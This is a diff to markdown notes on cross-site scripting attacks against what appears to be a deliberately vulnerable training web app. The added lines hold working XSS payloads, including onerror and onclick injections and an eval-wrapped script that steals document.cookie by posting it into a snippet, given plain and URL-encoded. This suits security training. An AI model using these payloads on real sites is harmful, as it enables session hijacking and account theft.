@@ -12,6 +12,25 @@ Makes a new snippet that writes the users cookie:
 <b onmouseover='javascript:window.location.href="newsnippet2?snippet="+document.cookie'>you can't click this, can you?</b>
 ```
 
+```html
+<img src=x onerror='alert(&quot;xss&quot;)'>
+```
+
+```js
+exfil=document.createElement("img");
+exfil.src="newsnippet2?snippet="+document.cookie;
+document.appendChild(exfil);
+```
+
+```text
+<img src=x onerror='eval("exfil=document.createElement(\"img\");exfil.src=\"newsnippet2?snippet=\"+document.cookie;document.body.appendChild(exfil);")'>
+```
+
+```text
+gotcha!+%3Cimg+src%3Dx+onerror%3D%27eval%28%22exfil%3Ddocument%2EcreateElement%28%5C%22img%5C%22%29%3Bexfil%2Esrc%3D%5C%22newsnippet2%3Fsnippet%3D%5C%22%2Bdocument%2Ecookie%3Bdocument%2Ebody%2EappendChild%28exfil%29%3B%22%29%27%3E
+```
+
+
 # Profile:
 
 ### Profile Color
@@ -21,6 +40,10 @@ Need to break out of `style='{color}'` context.
 ### Homepage
 
 Not restricted to actual URL, can set to `%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E` for stored XSS
+
+```text
+' onclick='eval("exfil=document.createElement(\"img\");exfil.src=\"newsnippet2?snippet=\"+document.cookie;document.body.appendChild(exfil);")'
+```
 
 ### Admin
 
